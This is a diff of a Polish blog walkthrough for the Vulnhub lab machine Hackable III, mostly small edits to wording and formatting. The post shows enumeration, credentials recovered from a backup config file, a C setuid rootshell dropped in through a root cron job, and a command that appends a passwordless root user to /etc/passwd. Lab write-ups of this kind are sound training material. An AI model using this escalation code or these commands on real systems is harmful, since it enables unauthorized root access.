@@ -7,6 +7,7 @@ categories:
 tags:
   - Hacking
   - Vulnhub
+  - Hackable
 header:
   overlay_image: /assets/images/pasek-hack.png
 gallery1_2:
@@ -24,7 +25,7 @@ gallery4_5:
     image_path: /assets/images/hacking/2021/06/05.png
 ---
 # Wstęp
-[Hackable III](https://www.vulnhub.com/entry/hackable-iii,720/) jest najnowszą maszyną od [Eliasa Soulsa](https://www.vulnhub.com/author/elias-sousa,804/) (stan na lipiec 2021). Oznaczona jest poziomem **medium**. Nie jest taka łatwa, jak opisywane wcześniej maszynki. Jest bardzo podchwytliwa i straciłem nad nią dosyć dużo czasu, ale człowiek uczy się całe życie. **Metasploita** będę używał, ale nie jest on tutaj głównym narzędziem. Mała uwaga, na XCP-ng musisz nazwę interfejsu sieciowego zmienić w dwóch miejscach. Rozwiązanie podaje na końcu, gdyż to może komuś zepsuć zabawę.
+[Hackable III](https://www.vulnhub.com/entry/hackable-iii,720/)  jest najnowszą maszyną od [Eliasa Soulsa](https://www.vulnhub.com/author/elias-sousa,804/) (stan na lipiec 2021). Oznaczona jest poziomem **medium**. Nie jest tak łatwa, jak opisywane wcześniej maszynki. Jest bardzo podchwytliwa i straciłem nad nią dosyć dużo czasu, ale człowiek uczy się całe życie. Metasploita będę używał, ale nie jest on tutaj głównym narzędziem. Mała uwaga, na XCP-ng musisz nazwę interfejsu sieciowego zmienić w dwóch miejscach. Rozwiązanie podaje na końcu, gdyż to może komuś zepsuć zabawę.
 {: .text-justify}
 ## Zaczynamy
 ```bash
@@ -34,13 +35,13 @@ host          port  proto  name  state     info
 172.16.1.103  22    tcp    ssh   filtered
 172.16.1.103  80    tcp    http  open      Apache httpd 2.4.46 (Ubuntu)
 ```
-Mamy dwa porty, 80 i 22. Jeden jest filtrowany. Zacznijmy od WWW. Wchodząc na stronę mamy takie coś (Kierujemy się na górny lewy róg) i mamy menu.
+Mamy dwa porty, 80 i 22. Jeden jest filtrowany. Zacznijmy od www. Wchodząc na stronę mamy takie coś (Kierujemy się na górny lewy róg) i mamy menu.
 {: .text-justify}
 {% include gallery id="gallery1_2"  %}
 Logowanie nic nam nie daje. W kodzie źródłowym (http://172.16.1.103/login_page/login.html) jest informacja, że to może do końca nie działać: *This page is not ready, may give error*. Bawiąc się Burpsuitem i odpalając powyższy link, Burpsuite kieruje nas do  http://172.16.1.103/login.php, a tam jest coś dziwnego, zamiast wyniku z logowania, dostajemy kod źródłowy w PHP. Z początku myślałem, że to jest ułatwienie dla pentestera i PHP nam wyświetla tę informacje, żeby ułatwić zadanie, ale nie. Niezależnie jakie parametry podasz, to jest zwykły kod w HTML-u, tyle że ma rozszerzenie php! Na nic się zda wstrzykiwanie parametrów. Zanim do tego doszedłem minęło trochę czasu, ale to był ciekawy pomysł autora.
 {: .text-justify}
 {% include gallery id="gallery3"  %}
-Sprawdźmy co jest jeszcze na na tym serwerze WWW:
+Sprawdźmy co jest jeszcze na na tym serwerze www:
 {: .text-justify}
 ```bash
 root@kali:/home/szikers# gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://172.16.1.103 -x php,txt,html,htm,png,jpg,
@@ -199,7 +200,7 @@ drwxr-xr-x 5 www-data www-data  4096 Jun 30 20:37 login_page
 -rw-r--r-- 1 www-data www-data    33 Apr 21 17:58 robots.txt
 -rw-r--r-- 1 root     root        24 Jul 30 18:30 test.php
 ```
-Pominąłem **.backup_config.php**, a w nim jest login i hasło dla użytkownika **hackable_3**:
+Pominąłem **.backup_config.php**, a w nim jest login i hasło dla użytkownika **hackable_3**
 {: .text-justify}
 ```php
 <?php
@@ -260,9 +261,8 @@ Aug 10 22:36:01 ubuntu20 CRON[5187]: (root) CMD (python3 /scripts/to_hackable_3.
 Aug 10 22:38:01 ubuntu20 CRON[5193]: (root) CMD (python3 /scripts/to_hackable_3.py)
 Aug 10 22:40:01 ubuntu20 CRON[5201]: (root) CMD (python3 /scripts/to_hackable_3.py)
 ```
-## Własny Rootshell
-Crontab nie może uruchomić z **Root-a** programu **/scripts/to_hackable_3.py**. Akcja działa co 2 minuty. Pomóżmy mu, aby się Crontab nie męczył. :smiley: Ale zanim to nastąpi, to skompilujmy u siebie na konsoli (niestety nie mamy tutaj **gcc**) prosty Rootshell i wrzućmy go na konto. A czemu tak się bawić? Zwykłe skrypty z ustawionym bitem Suid nie przechodzą na Root-a z innego użytkownika, więc najlepiej napisać program i go skompilować:
-{: .text-justify}
+## Włany Rootshell
+Crontab nie może uruchomić z **Root-a** programu **/scripts/to_hackable_3.py**. Akcja działa co 2 minuty. Pomóżmy mu, aby się Crontab nie męczył :smiley:, ale zanim to nastąpi skompilujmy u siebie na konsoli (niestety nie mamy tutaj **gcc**) prosty rootshell i wrzućmy go na konto. A czemu tak się bawić? Zwykłe skrypty z ustawionym bitem Suid nie przechodzą na Root-a z innego użytkownika, więc najlepiej napisać program i go skompilować:
 ```c
 void main()
 { setuid(0);
@@ -270,18 +270,9 @@ void main()
   system("/bin/bash");
 }
 ```
-```bash
-gcc rootshell.c -o rootshell
-```
-Rootshell wrzucamy wrzucamy na **Hackable: III** na konto **hackable_3** do katalogu domowego katalogu a potem kopiujemy do /scripts/:
-{: .text-justify}
+Rootshell wrzucamy do katalogu:
 ```bash
 cp /home/hackable_3/rootshell /scripts/
-```
-Trzeba stworzyć plik **/scripts/to_hackable_3.py**:
-{: .text-justify}
-```bash
-touch /scripts/to_hackable_3.py && chmod +x /scripts/to_hackable_3.py
 ```
 A zawartość **/scripts/to_hackable_3.py** może wyglądać tak:
 {: .text-justify}
@@ -303,14 +294,13 @@ drwxr-xr-x 21 root       root        4096 Apr 29 16:32 ..
 -rwxrwxr-x  1 hackable_3 hackable_3   251 Aug 10 21:59 to_hackable_3.py
 ```
 **Rootshell** ma Suida i Root-a:
-{: .text-justify}
 ```console
 hackable_3@ubuntu20:/scripts$ ./rootshell
 root@ubuntu20:/scripts# id
 uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd),1000(hackable_3)
 root@ubuntu20:/scripts#
 ```
-Zamiast tworzyć Rootshell, to możemy dodać użytkownika do pliku **/etc/passwd**:
+Zamiast tworzyć rootshell, to możemy dodać użytkownika do pliku **/etc/passwd**:
 {: .text-justify}
 ```bash
 echo 'kerszi::0:0:,,,:/root:/bin/bash' >> /etc/passwd
@@ -319,7 +309,5 @@ echo 'kerszi::0:0:,,,:/root:/bin/bash' >> /etc/passwd
 Uwaga, jeżeli chcesz, żeby ta maszyna działała na XCP-ng trzeba podczas startu systemu zmienic w Grubie ro na rw init=/bin/bash, potem F10, w /etc/netplan/00-installer-config.yaml zmieniamy na interfejs eth0. Dodatkowo należy zmienić w /etc/default/knockd na KNOCKD_OPTS="-i eth0".
 {: .text-justify}
 {: .notice--danger}
-Jeżeli się podobała solucja, to napisz na [kerszi@protonmail.com](mailto:kerszi@protonmail.com)
+Jeżeli się podobała solucja, to napisz na [kerszi@protonmail.com](mailto:kerszi@protonmail.com).
 {: .text-justify}
-{: .notice--info}
-
